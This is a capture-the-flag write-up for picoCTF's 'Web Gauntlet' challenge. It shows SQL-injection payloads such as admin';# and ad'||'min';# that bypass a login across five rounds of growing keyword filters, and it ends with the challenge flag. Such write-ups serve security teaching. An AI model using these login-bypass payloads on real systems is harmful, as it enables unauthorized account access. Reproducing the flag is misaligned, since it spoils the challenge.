# Web Gauntlet

> Points: 200

> Category: Web Exploitation

## Description

Can you beat the filters? Log in as admin

http://jupiter.challenges.picoctf.org:40791/

http://jupiter.challenges.picoctf.org:40791/filter.php

## Solution

When I put a single quote in the username and password field, this pops up on the top left

`SELECT * FROM users WHERE username=''' AND password='''`

Now we know this website is vulnerable to SQL injection.

##### ROUND 1

- Filter: **or**

1. Username = `admin';#`
2. Password = `sdf`

##### ROUND 2

- Filter: **or and like = --**

1. Username = `admin';#`
2. Password = `sdf`

##### ROUND 3

- Filter: **or and = like > < --**

1. Username = `admin';#`
2. Password = `sdf`

##### Round 4

- Filter: **or and = like > < -- admin**

1. Username = `ad'||'min';#`
2. Password = `sdf`

[Concat strings in sqlite](https://www.sqlitetutorial.net/sqlite-string-functions/sqlite-concat/)

##### Round 5

- Filter: **or and = like > < -- union admin**

1. Username = `ad'||'min';#`
2. Password = `sdf`

### Flag

> picoCTF{y0u_m4d3_1t_96486d415c04a1abbbcf3a2ebe1f4d02}
